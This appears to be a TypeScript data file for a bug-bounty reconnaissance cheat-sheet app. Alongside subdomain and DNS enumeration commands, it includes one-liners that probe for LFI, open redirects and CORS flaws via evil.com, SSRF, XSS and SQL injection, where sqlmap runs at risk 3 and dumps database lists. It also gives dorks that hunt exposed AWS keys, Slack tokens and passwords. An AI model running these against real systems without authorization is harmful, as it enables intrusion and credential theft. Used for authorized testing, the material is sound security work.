import { ReconSection, ContentType } from './types';

export const RECON_DATA: ReconSection[] = [
  {
    id: 'initial-gathering',
    title: 'Initial Gathering',
    items: [
      {
        id: 'ig-1',
        title: 'Org Info & AS Number',
        description: 'Find Organization Name, NetName, and AS Number.',
        type: ContentType.COMMAND,
        content: `whois target.com | grep "NetName\\|OrgName\\|AS"`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-2',
        title: 'AS Lookup',
        description: 'Lookup AS information via HackerTarget API.',
        type: ContentType.COMMAND,
        content: `curl -s https://api.hackertarget.com/aslookup/?q=target.com`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-3',
        title: 'CIDR Ranges',
        description: 'Find CIDR ranges associated with an AS Number (replace ASXXXXX).',
        type: ContentType.COMMAND,
        content: `whois ASXXXXX | grep -E "CIDR|inetnum"`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-4',
        title: 'Subdomains (crt.sh)',
        description: 'Get subdomains from crt.sh and parse JSON.',
        type: ContentType.COMMAND,
        content: `curl -s https://crt.sh/\\?q\\=%.target.com\\&output\\=json | jq -r '.[].name_value' | sort -u`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-5',
        title: 'Subdomains (csprecon)',
        description: 'Get subdomains using csprecon.',
        type: ContentType.COMMAND,
        content: `csprecon -l targets.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-6',
        title: 'Historical Robots.txt',
        description: 'Get historical robots.txt entries from Web Archive.',
        type: ContentType.COMMAND,
        content: `curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/robots.txt&output=json" | jq '.[1:] | .[] | .[2]' | sort -u > historical_robots.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-7',
        title: 'Pastebin Scrape',
        description: 'Scrape Pastebin for mentions of the target domain.',
        type: ContentType.COMMAND,
        content: `curl -s "https://scrape.pastebin.com/api_scraping.php?limit=100" | grep -Eo "target\\.com" | sort -u`,
        meta: { language: 'bash' }
      },
      {
        id: 'ig-8',
        title: 'Secret Scanning (Trufflehog)',
        description: 'Try to find data across various sources using trufflehog.',
        type: ContentType.COMMAND,
        content: `trufflehog s3 --bucket="", trufflehog github --repo="", trufflehog github --org="", trufflehog git "", trufflehog gcs --project-id="", trufflehog filesystem "", trufflehog postman --token=<postman api token> --workspace-id=<workspace id>`,
        meta: { language: 'bash' }
      }
    ]
  },
  {
    id: 'automated-scans',
    title: 'Automated Scans',
    items: [
      {
        id: 'as-1',
        title: 'Vulnerability Assessment',
        type: ContentType.TEXT,
        content: `Start the recon process with some vulnerability assessments & automation easy recon tools like magicrecon, rapidscan, sniper, frogy2.0, raccon, openvas, or omsedaus to get some quick initial information.`
      }
    ]
  },
  {
    id: 'recon-steps',
    title: 'Recon Steps',
    items: [
      {
        id: 'rs-1',
        title: '1. Subdomain Collection (Initial)',
        type: ContentType.LIST,
        description: 'Collect initial subdomains from various sources:',
        content: [
          'https://shrewdeye.app/',
          'https://pentest-tools.com/',
          'ShodanX',
          'crt.sh',
          'Amass',
          'Builtwith relationship scripts'
        ]
      },
      {
        id: 'rs-1-cmd',
        title: 'crt.sh Parsing',
        type: ContentType.COMMAND,
        content: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | anew crtsh_subs.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'rs-2',
        title: '2. Subdomain Enum & DNS Scanning',
        type: ContentType.TEXT,
        content: 'Find other subdomains using `assetfinder`, `subfinder`. Scan the DNS using `dnsrecon`, `dnsenum`.'
      },
      {
        id: 'rs-3',
        title: '3. DNS Exploitation & Analysis',
        type: ContentType.LIST,
        content: [
          'Use `cloudenum` after ensuring you have collected all subdomains.',
          'Check for DNS vulnerabilities/misconfigurations using `dnschef`, `dnstake`, `dnsdumpster`.',
          'Use `theharvester`.',
          'Use `eyewitness` for screenshots.'
        ]
      },
      {
        id: 'rs-4',
        title: '4. HTTP/HTTPS Probing',
        description: 'Probe collected subdomains with httpx.',
        type: ContentType.COMMAND,
        content: `sudo httpx -l allsubs.txt -sc -td -title -wc -bp -cdn --websocket --follow-redirects\nsudo httpx -l allsubs.txt # (Basic probe)`,
        meta: { language: 'bash' }
      },
      {
        id: 'rs-5',
        title: '5. HTTP Vulnerability Scanning',
        type: ContentType.TEXT,
        content: 'Use `HXCC-scanner`, `HexHTTP` with the list of live hosts from httpx to detect possible HTTP vulnerabilities.'
      },
      {
        id: 'rs-6',
        title: '6. Subdomain Takeover Check',
        type: ContentType.COMMAND,
        description: 'Use subzy to check for takeovers.',
        content: `sudo subzy run --targets live_subs.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'rs-10',
        title: '10. HTTP Request Smuggling',
        type: ContentType.COMMAND,
        content: `cat httpx.txt | python smuggler.py | tee -a smuggler.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'rs-14',
        title: '14. GitHub GraphQL Search',
        description: 'Execute in GitHub GraphQL Explorer.',
        type: ContentType.COMMAND,
        content: `{\n  "query": "query { search(query: \\"<<target>>.com\\", type: REPOSITORY, first: 10) { edges { node { ... on Repository { name url } } } } }"\n}`,
        meta: { language: 'graphql' }
      },
      {
        id: 'rs-16',
        title: '16. JavaScript Analysis',
        description: 'Extract endpoints from JS files.',
        type: ContentType.COMMAND,
        content: `cat urls.txt | grep ".js" | while read url; do curl -s "$url" | grep -Eo "https?://[^\\"']+"; done | tee js_endpoints.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'rs-16-nuclei',
        title: 'JS Scan with Nuclei',
        type: ContentType.COMMAND,
        content: `nuclei -l js.txt -t ~/nuclei-templates/http/exposures/ -o js_bugs.txt`,
        meta: { language: 'bash' }
      },
      {
        id: 'rs-20',
        title: '20. Vulnerability Scanning (Nuclei)',
        type: ContentType.COMMAND,
        content: `nuclei -l httpx.txt -rl 10 -bs 35 -c 50 -as -s critical,high,medium`,
        meta: { language: 'bash' }
      }
    ]
  },
  {
    id: 'one-liners',
    title: 'One-Liners',
    items: [
      {
        id: 'ol-lfi',
        title: 'LFI (Local File Inclusion)',
        type: ContentType.COMMAND,
        content: `cat targets.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"`,
        meta: { language: 'bash' }
      },
      {
        id: 'ol-oprd',
        title: 'OPRD (Open Redirect)',
        type: ContentType.COMMAND,
        content: `echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \\=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \\033[0;31mVulnerable\\n" ;done`,
        meta: { language: 'bash' }
      },
      {
        id: 'ol-ssrf-1',
        title: 'SSRF v1',
        type: ContentType.COMMAND,
        content: `cat urls.txt | grep "=" | qsreplace "YOUR_BURP_COLLABORATOR_LINK" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr`,
        meta: { language: 'bash' }
      },
      {
        id: 'ol-xss',
        title: 'XSS (Cross-Site Scripting)',
        type: ContentType.COMMAND,
        content: `cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe`,
        meta: { language: 'bash' }
      },
      {
        id: 'ol-sqli',
        title: 'SQLi (SQL Injection)',
        type: ContentType.COMMAND,
        content: `cat subs.txt | (gau || hakrawler || katana || waybackurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs && for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done`,
        meta: { language: 'bash' }
      },
      {
        id: 'ol-cors',
        title: 'CORS Misconfiguration',
        type: ContentType.COMMAND,
        content: `echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then echo "[Potentional CORS Found] $url";else echo "Nothing on $url";fi;done`,
        meta: { language: 'bash' }
      }
    ]
  },
  {
    id: 'resources',
    title: 'Notes & Dorks',
    items: [
      {
        id: 'dorks-shodan',
        title: 'Shodan Dorks (Golden)',
        type: ContentType.DORK_LIST,
        content: [
          'ssl:"target.com" http.status:200 http.title:"dashboard"',
          'org:"target.com" http.component:"jenkins" http.status:200',
          'ssl:"target.com" http.status:200 product:"ProFTPD" port:21',
          'http.html:"zabbix" vuln:CVE-2022-24255',
          'org:"target.com" http.title:"phpMyAdmin"',
          'ssl:"target.com" http.title:"BIG-IP" vuln:CVE-2020-5902',
          'ssl.cert.subject.cn:*.target.com http.title:"Dashboard [Jenkins]"',
          'http.html:"xoxb-" (Slack Tokens)',
          'http.html:"AKIA" (AWS Keys)',
          'http.title:"swagger UI" org:"Target"',
          'Set-Cookie:"mongo-express=" "200 OK"',
          'http.title:"Django REST framework"'
        ]
      },
      {
        id: 'dorks-google',
        title: 'Google Dorks (Golden)',
        type: ContentType.DORK_LIST,
        content: [
          'site:docs.google.com/spreadsheets "Target"',
          'site:groups.google.com "Target"',
          'intitle:"Swagger UI" site:target.com',
          'site:target.com inurl:login | inurl:signin | intitle:Login',
          'site:domain.com inurl:view inurl:private ext:pdf',
          'site:domain.com inurl:upload ext:pdf',
          'site:domain.com ext:py',
          'site:domain.com "Choose File"'
        ]
      },
      {
        id: 'dorks-github',
        title: 'GitHub Dorks',
        type: ContentType.DORK_LIST,
        content: [
          'target.com SECRET_KEY | DB_PASSWORD',
          'target.com "INSERT INTO users"',
          'target.com "aws_access_key_id"',
          'target.com "Authorization: Bearer"',
          'target.com "mongodb://username:password@"',
          'target.com filename:vim_settings.xml'
        ]
      },
      {
        id: 'script-browser',
        title: 'Browser Console Endpoint Extractor',
        description: 'Run this in the browser console to extract all linked endpoints.',
        type: ContentType.SCRIPT,
        content: `(() => {
    const p = [...new Set([...document.querySelectorAll("a[href]")].map(a => new URL(a.href, location.href).pathname))],
        b = new Blob([p.join("\\n")], { type: "text/plain" }),
        a = Object.assign(document.createElement("a"), { href: URL.createObjectURL(b), download: \`\${location.hostname.replace(/^www\\./,"")}.txt\` });
    document.body.appendChild(a), a.click(), document.body.removeChild(a);
})();`,
        meta: { language: 'javascript' }
      }
    ]
  }
];